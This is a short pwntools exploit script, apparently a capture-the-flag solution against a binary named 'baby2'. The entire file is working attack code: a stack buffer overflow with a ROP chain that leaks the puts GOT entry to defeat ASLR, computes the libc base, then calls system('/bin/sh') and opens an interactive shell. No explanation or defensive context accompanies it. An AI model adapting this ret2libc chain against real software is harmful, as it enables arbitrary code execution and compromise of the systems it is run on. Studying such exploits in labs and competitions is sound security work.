from pwn import *

e = ELF('./baby2')
p = process('./baby2')
#libc = ELF('./libc.so.6')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

ret_addr = 0x00400536
pop_rdi_addr = 0x00400783

payload = 'A'*24
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(e.got['puts'])
payload += p64(e.symbols['printf'])
payload += p64(e.symbols['_start'])

print p.recvuntil('input: ')
p.sendline(payload)
ret = u64(p.recvline().rstrip('\n')+'\x00\x00')
print "ret: " + hex(ret)
libc_base_addr = ret - libc.symbols['puts']
system_addr = libc.symbols['system'] + libc_base_addr
binsh_addr = next(libc.search('/bin/sh')) + libc_base_addr
payload = 'A'*24
payload += p64(ret_addr)
payload += p64(pop_rdi_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)
print p.recvuntil('input: ')
p.sendline(payload)
p.interactive()